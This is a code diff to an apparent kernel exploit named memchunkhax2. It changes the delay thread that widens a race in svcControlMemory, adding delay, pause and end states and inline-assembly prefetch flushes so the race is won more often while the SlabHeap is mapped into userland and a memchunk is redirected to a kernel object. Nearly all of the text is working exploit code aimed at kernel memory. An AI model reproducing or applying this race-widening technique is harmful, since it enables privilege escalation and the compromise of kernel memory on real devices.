@@ -111,14 +111,28 @@ static void kernel_entry()
 	kernelHacked = 0;
 }
 
+enum delayerCtx {
+	DELAYER_DELAY,
+	DELAYER_PAUSE,
+	DELAYER_END
+};
+
 // Thread function to slow down svcControlMemory execution.
 static void delay_thread(void* arg)
 {
-	AllocateData* data = (AllocateData*)arg;
+	volatile enum delayerCtx* ctx = arg;
 
-	// Slow down thread execution until the control operation has completed.
-	while(data->result == -1)
-		svcSleepThread(10000);
+	while(*ctx != DELAYER_END) {
+		while (*ctx == DELAYER_DELAY) {
+			// Flush prefetch buffer to slow down
+			__asm__ volatile ("mcr p15, 0, %0, c7, c5, 4" :: "r"(0));
+
+			// Allow allocate_thread to interrupt
+			svcSleepThread(8192);
+		}
+
+		while (*ctx == DELAYER_PAUSE);
+	}
 }
 
 // Thread function to allocate memory pages.
@@ -153,6 +167,7 @@ int memchunkhax2()
 	Handle kObjHandle = 0;
 	u32 kObjAddr = 0;
 	Thread delayThread = NULL;
+	volatile enum delayerCtx delayer;
 	Result res;
 	
 	debugPrint("#1 : Allocating buffers...\n");
@@ -202,7 +217,8 @@ int memchunkhax2()
 	
 	debugPrint("#3 : Map SlabHeap in userland...\n");
 	// Create thread to slow down svcControlMemory execution and another to allocate the pages.
-	delayThread = threadCreate(delay_thread, data, 0x4000, 0x18, 1, true);
+	delayer = DELAYER_DELAY;
+	delayThread = threadCreate(delay_thread, (void *)&delayer, 0x4000, 0x18, 1, true);
 	if(!delayThread)
 		debugPrintError("ERROR : Can't create delaying thread.\n");
 		
@@ -210,16 +226,20 @@ int memchunkhax2()
 		debugPrintError("ERROR : Can't create allocating thread.\n");
 	
 	waitUserlandAccessible(data->addr);	// This oracle will tell us exactly when we can write in memory.
+	delayer = DELAYER_PAUSE;
 	((MemChunkHdr*) data->addr)->next = (MemChunkHdr*) kObjAddr;   // Edit the memchunk to redirect mem mapping.
 	
 	// Perform a backup of the kernel page (or at least for what we can)
-	waitUserlandAccessible(data->addr + PAGE_SIZE + (kObjAddr & 0xFFF)); 
+	delayer = DELAYER_DELAY;
+	waitUserlandAccessible(data->addr + PAGE_SIZE + (kObjAddr & 0xFFF));
+	delayer = DELAYER_PAUSE;
 	memcpy(backup, (void*) (data->addr + PAGE_SIZE + (kObjAddr & 0xFFF) ), PAGE_SIZE - (kObjAddr & 0xFFF));
 	if(data->result != -1)
 		debugPrintError("ERROR : Race condition failed.\n");
 	
 	debugPrint("#4 : Overwrite completed...\n");
 	// Wait for memory mapping to complete.
+	delayer = DELAYER_END;
 	while(data->result == -1)
 		svcSleepThread(1000000);
 	if(data->result != 0)
@@ -240,10 +260,6 @@ int memchunkhax2()
 	debugPrint("#7 : Clean memory...\n");
 	if(data != NULL && data->result == 0)
 		svcControlMemory(&data->addr, data->addr, 0, data->size, MEMOP_FREE, MEMPERM_DONTCARE);
-
-	// Stop the delaying thread
-	if(delayThread != NULL && data != NULL && data->result == -1)
-		data->result = 0;
 
 	if(isolatedPage != 0) {
 		svcControlMemory(&isolatedPage, isolatedPage, 0, PAGE_SIZE, MEMOP_FREE, MEMPERM_DONTCARE);
